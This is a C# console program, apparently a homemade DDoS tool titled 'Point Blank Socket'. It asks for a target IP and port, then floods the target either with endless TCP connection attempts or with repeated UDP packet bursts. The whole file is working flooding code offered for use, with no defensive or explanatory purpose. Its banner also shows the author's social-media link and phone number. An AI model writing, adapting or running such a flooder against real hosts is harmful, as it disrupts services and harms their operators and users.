using Script___DDos.Classes;
using Script___DDos.Log;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Script___DDos
{
    /*
     * @autor: Wesley
     * Multi Conexão em Socket
     */
    public class Program
    {
        public static IPAddress Address;
        public static string IP;
        public static int Port;
        public static void Main(string[] args)
        {
            Console.Title = "Point Blank Socket";
            SendInitia:
            Comp.Blue("╔════════════════════════════════════════════════════════════════════════════╗");
            Comp.Blue("║                                                                            ║");
            Comp.Blue("║               *</>  Developed by: (c) Wesley Vale - 2019  </>*             ║");
            Comp.Blue("║                                                                            ║");
            Comp.Blue("║                                                www.fb.com/wesley.vale.3192 ║");
            Comp.Blue("║                                                wpp: 92 99188-0629          ║");
            Comp.Blue("╚════════════════════════════════════════════════════════════════════════════╝");
            Comp.Blue("╔══════════════════════════════╗                                  build: 0.2");
            Comp.Blue("║        [ MENU ]              ║");
            Comp.Blue("║  -  t  (Flodar Pacotes tcp)  ║");
            Comp.Blue("║  -  u  (Flodar Pacotes tcp)  ║");
            Comp.Blue("╚══════════════════════════════╝");
            Comp.Yellow("[Console] Bem Vindo ao Point Blank SocketDump: ");
            string inicial = Console.ReadLine().ToLower();
            switch (inicial)
            {
                case "t":
                    {
                        if (!Sistema(inicial))
                            return;
                        new Thread(() =>
                        {
                            int index = 0;
                            while (true)
                            {
                                try
                                {
                                    byte[] buffer = new byte[0];
                                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    socket.Connect(new IPEndPoint(Address, Port));
                                    if (socket.Connected)
                                    {
                                        socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, (callback) =>
                                        {
                                            Socket id = (Socket)callback.AsyncState;
                                            if (id.Poll(0, SelectMode.SelectRead))
                                            {
                                                if (id.Receive(buffer, SocketFlags.Peek) == 0)
                                                {
                                                    socket.Send(buffer, buffer.Length, SocketFlags.None);
                                                    Comp.Green("[Socket TCP] Sending Packet Dump        nº[" + ++index + "]");
                                                }
                                            }
                                        }, socket);
                                    }
                                }
                                catch (SocketException ex)
                                {
                                    Comp.Red(ex.Message);
                                    break;
                                }
                            }

                        }).Start(); break;
                    }
                case "u":
                    {
                        if (!Sistema(inicial))
                            return;
                        new Thread(() =>
                        {
                            for (int index = 0; index <  IPEndPoint.MaxPort; index++)
                            {
                                try
                                {
                                    UdpClient udp = new UdpClient(IP, Port);
                                    if (udp.Available == 0)
                                    {
                                        byte[] buff = SyncClient.Data();
                                        udp.Send(buff, buff.Length);
                                        Comp.Cyan("[Socket UDP] Sending Packet Dump           Buffer: [" + buff.Length + "]     nº[" + index + "]");
                                    }
                                }
                                catch (SocketException ex)
                                {
                                    Comp.Red(ex.ToString());
                                    break;
                                }
                            }
                        }).Start();
                        break;
                    }
                default:
                    {
                        Comp.White("[Error] Erro ao registrar a conexão especifica.");
                        Console.Clear();
                        goto SendInitia;
                    }
            }
            Process.GetCurrentProcess().WaitForExit();
        }
        public static byte[] addByteToArray(byte[] bArray, byte newByte)
        {
            byte[] newArray = new byte[bArray.Length + 1];
            bArray.CopyTo(newArray, 1);
            newArray[0] = newByte;
            return newArray;
        }
        public static bool Sistema(string txt)
        {
            if (txt.Equals("t"))
            {
                try
                {
                    Comp.Yellow("[Console] Conexão TCP, Digite o IP: ");
                    IP = Console.ReadLine();
                    Comp.Yellow("[Console] Conexão TCP, Digite a Porta: ");
                    Port = int.Parse(Console.ReadLine());
                    if (IPAddress.TryParse(IP, out Address) && Port > 0 && Port < IPEndPoint.MaxPort && IP != null)
                        return true;
                }
                catch
                {
                    Comp.Red("Error ao registrar o IP e a Porta, Tente novamente.");
                    return false;
                }
            }
            else if (txt.Equals("u"))
            {
                try
                {
                    Comp.Yellow("[Console] Conexão UDP, Digite o IP: ");
                    IP = Console.ReadLine();
                    Comp.Yellow("[Console] Conexão UDP, Digite a Porta: ");
                    Port = int.Parse(Console.ReadLine());
                    if (IPAddress.TryParse(IP, out Address) && Port > 0 && Port < IPEndPoint.MaxPort && IP != null)
                        return true;
                }
                catch
                {
                    Comp.Red("Error ao registrar o IP e a Porta, Tente novamente.");
                    return false;
                }
            }
            return false;
        }
    }
}
